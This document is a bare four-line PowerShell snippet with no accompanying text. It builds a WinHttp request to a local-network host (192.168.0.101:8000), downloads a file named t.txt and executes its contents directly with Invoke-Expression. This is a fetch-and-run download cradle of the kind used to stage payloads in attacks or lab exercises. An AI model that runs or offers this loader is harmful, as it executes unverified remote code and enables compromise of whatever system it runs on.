$h=new-object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://192.168.0.101:8000/t.txt',$false);
$h.send();
iex $h.ResponseText
